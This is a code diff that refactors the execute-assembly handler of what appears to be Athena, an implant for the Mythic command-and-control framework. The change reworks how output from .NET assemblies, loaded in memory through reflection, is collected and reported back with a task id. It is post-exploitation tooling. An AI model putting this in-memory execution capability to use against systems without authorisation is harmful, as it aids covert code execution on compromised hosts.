@@ -11,7 +11,6 @@ using System.Threading.Tasks;
 using System.Runtime.Loader;
 using System.Reflection;
 using Athena.Models.Athena.Assembly;
-using System.Text;
 using System.Collections.Concurrent;
 
 namespace Athena.Commands
@@ -22,6 +21,7 @@ namespace Athena.Commands
         private ExecuteAssemblyContext executeAssemblyContext { get; set; }
         private ConcurrentDictionary<string, Assembly> loadedCommands { get; set; }
         public bool assemblyIsRunning { get; set; }
+        public string assemblyTaskId { get; set; }
         private StringWriter executeAssemblyWriter { get; set; }
         public AssemblyHandler()
         {
@@ -88,8 +88,7 @@ namespace Athena.Commands
             
             //Indicating an execute-assembly task is running.
             this.assemblyIsRunning = true;
-
-            string output;
+            this.assemblyTaskId = job.task.id;
 
             //Add an alert for when the assembly is finished executing
             try
@@ -108,21 +107,18 @@ namespace Athena.Commands
                     //Invoke the Assembly
                     assembly.EntryPoint.Invoke(null, new object[] { await Misc.SplitCommandLine(ea.arguments) }); //I believe this blocks until it's finished
 
-                    output = await this.GetAssemblyOutput(); //For now
-
                     //Return StdOut back to original location
                     Console.SetOut(origStdOut);
                 }
 
                 this.assemblyIsRunning = false;
 
+                ResponseResult result = await this.GetAssemblyOutput();
+                result.user_output += Environment.NewLine + "Finished Executing.";
+
+                return result;
+
                 //Maybe set an event that the execution is finished?
-                return new ResponseResult
-                {
-                    completed = "true",
-                    user_output = output,
-                    task_id = job.task.id
-                };
             }
             catch (Exception e)
             {
@@ -136,11 +132,16 @@ namespace Athena.Commands
             }
         }
         //Might be able to return this as an object too
-        public async Task<string> GetAssemblyOutput()
+        public async Task<ResponseResult> GetAssemblyOutput()
         {
             await this.executeAssemblyWriter.FlushAsync();
 
-            return this.executeAssemblyWriter.GetStringBuilder().ToString();
+            return new ResponseResult
+            {
+                user_output = this.executeAssemblyWriter.GetStringBuilder().ToString(),
+                task_id = this.assemblyTaskId,
+                completed = (!this.assemblyIsRunning).ToString()
+            };
         }
         public async Task<ResponseResult> ClearAssemblyLoadContext(MythicJob job)
         {
